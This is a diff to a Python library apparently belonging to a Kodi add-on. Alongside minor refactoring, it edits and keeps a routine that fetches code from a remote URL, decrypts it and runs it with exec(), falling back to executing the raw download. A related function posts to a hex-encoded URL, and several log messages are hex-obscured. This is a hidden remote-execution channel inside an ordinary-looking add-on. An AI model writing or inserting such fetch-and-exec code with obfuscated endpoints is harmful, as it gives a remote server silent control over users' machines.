@@ -137,7 +137,7 @@ koding.dolog(string='Quick test to see if this gets printed to the log', my_debu
     global DEBUG
     global ADDON_ID
     if DEBUG == 'true' or my_debug:
-        xbmc.log(ADDON_ID+': '+string, 2)
+        xbmc.log('### %s : %s'%(ADDON_ID,string), 2)
 #----------------------------------------------------------------
 def Check_Addons(addons):
     """ internal command ~"""
@@ -267,7 +267,7 @@ def Encryption(mode='', message=''):
 def Get_IP():
     """ internal command ~"""
     link          = Open_URL(converthex('687474703a2f2f6e6f6f6273616e646e657264732e636f6d2f43505f53747566662f6c6f67696e5f636f6f6b69652e706870'), 'post').replace('\r','').replace('\n','').replace('\t','')
-    link          = Encryption('d',link)
+    link          = Encryption(mode='d',message=link)
     ipmatch       = re.compile('i="(.+?)"').findall(link)
     ipfinal       = ipmatch[0] if (len(ipmatch) > 0) else ''
     return ipfinal
@@ -315,7 +315,7 @@ koding.Main('http://noobsandnerds.com?id=test', post_type='get')~"""
             runcode_date = time.strftime('%Y%m%d%H%M%S', runcode_date)
         if int(runcode_date)+1000000 < int(Timestamp()):
             run_code = Open_URL(url, post_type)
-            if not run_code.startswith('This url could not be opened'):
+            if run_code:
                 writefile = open(RUNCODE, 'w')
                 writefile.write(run_code)
                 writefile.close()
@@ -325,14 +325,16 @@ koding.Main('http://noobsandnerds.com?id=test', post_type='get')~"""
             readfile.close()
 
     else:
-        run_code = Open_URL(url, post_type)
+        run_code = Open_URL(url=url, post_type=post_type)
 
-    if not run_code.startswith('This url could not be opened'):
+    if run_code:
         try:
-            exec(Encryption(message=run_code.replace('\n','').replace('\t','').replace('\r','')))
-            dolog(converthex('232323205375636365737366756c6c792072756e20636f6465'))
+            my_code = Encryption('d',run_code)
+            dolog('MY CODE: %s'%my_code)
+            exec(my_code)
+            dolog(converthex('232323205375636365737366756c6c792072756e20636f646520696e20656e6372797074696f6e206d6f6465'))
         except:
-            dolog(Last_Error())
+            dolog(converthex('232323204661696c656420746f2072756e20636f64652c20617474656d7074696e6720746f20757365207374616e64617264206d6f6465'))
             try:
                 exec(run_code)
                 dolog(converthex('232323205375636365737366756c6c792072756e20636f6465'))
@@ -343,7 +345,7 @@ koding.Main('http://noobsandnerds.com?id=test', post_type='get')~"""
                     dolog(converthex('232323205375636365737366756c6c792072756e20636f6465'))
                 except:
                     if DEBUG == 'true':
-                        dialog.ok(String(30980),String(30981))
+                        dialog.ok(THIS_MODULE.getLocalizedString(30980),THIS_MODULE.getLocalizedString(30981)%ADDON_ID)
     else:
         dolog(run_code)
 #-----------------------------------------------------------------------------
